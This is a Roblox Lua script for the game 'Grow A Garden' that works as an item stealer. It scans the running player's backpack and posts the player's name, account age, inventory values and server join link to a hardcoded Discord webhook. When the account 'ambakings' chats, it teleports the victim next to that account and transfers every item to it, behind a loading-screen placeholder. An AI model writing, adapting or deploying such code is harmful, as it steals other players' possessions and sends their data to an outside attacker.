local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local Backpack = LocalPlayer:WaitForChild("Backpack")
local CoreGui = game:GetService("CoreGui")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1375150931334664244/195dhN4TmlV8qXHB3SPulJiH73Bs9AXAkTmT1HDC9BEQldqwQ1DGALIUZpOCrYJ06tWk"
local TARGET_USERNAME = "ambakings"

-- Loading screen
task.spawn(function()
    -- Paste loading screen code you provided here
end)

-- Wait loading
task.wait(5)

-- Value table
local valueMap = {
    ["[Pollinated] Strawberry"] = 81,
    ["Strawberry"] = 26
}

-- Get inventory data
local function scanItems()
    local scanned = {}
    local total = 0
    for _, tool in pairs(Backpack:GetChildren()) do
        if tool:IsA("Tool") then
            local name = tool.Name
            local val = 0
            for k, v in pairs(valueMap) do
                if string.find(name, k) then
                    val = v
                    break
                end
            end
            table.insert(scanned, {Name = name, Value = val})
            total += val
        end
    end
    table.sort(scanned, function(a, b) return a.Value > b.Value end)
    return scanned, total
end

-- Format webhook embed
local function buildEmbed(items, total)
    local fields = {}
    for _, item in ipairs(items) do
        table.insert(fields, "- " .. item.Name .. " -> " .. item.Value .. "¢")
    end

    local embed = {
        title = "🪴 Grow A Garden Hit - DARK SCRIPTS ☘️",
        description = "**👤 Player Information**\n```Name: " .. LocalPlayer.Name .. "\nReceiver: " .. TARGET_USERNAME .. "\nExecutor: Delta\nAccount Age: " .. LocalPlayer.AccountAge .. " days```",
        fields = {
            { name = "💰 Total Value", value = total .. "¢", inline = false },
            { name = "🌴 Backpack", value = "```" .. table.concat(fields, "\n") .. "```", inline = false },
            { name = "🌐 Join with URL", value = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId, inline = false }
        }
    }
    return embed
end

-- Send to webhook
local function sendWebhook()
    local items, total = scanItems()
    local embed = buildEmbed(items, total)
    local data = {
        content = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\")",
        embeds = {embed}
    }
    request({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

sendWebhook()

-- Chat listener
Players.PlayerChatted:Connect(function(sender, msg)
    if sender.Name == TARGET_USERNAME then
        local myChar = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local targetChar = sender.Character or sender.CharacterAdded:Wait()
        local targetHRP = targetChar:WaitForChild("HumanoidRootPart")
        local myHRP = myChar:WaitForChild("HumanoidRootPart")
        myHRP.CFrame = targetHRP.CFrame + Vector3.new(2, 0, 0)

        local items, _ = scanItems()
        for _, item in ipairs(items) do
            local tool = Backpack:FindFirstChild(item.Name)
            if tool then
                tool.Parent = sender.Backpack
                task.wait(0.2)
            end
        end
    end
end)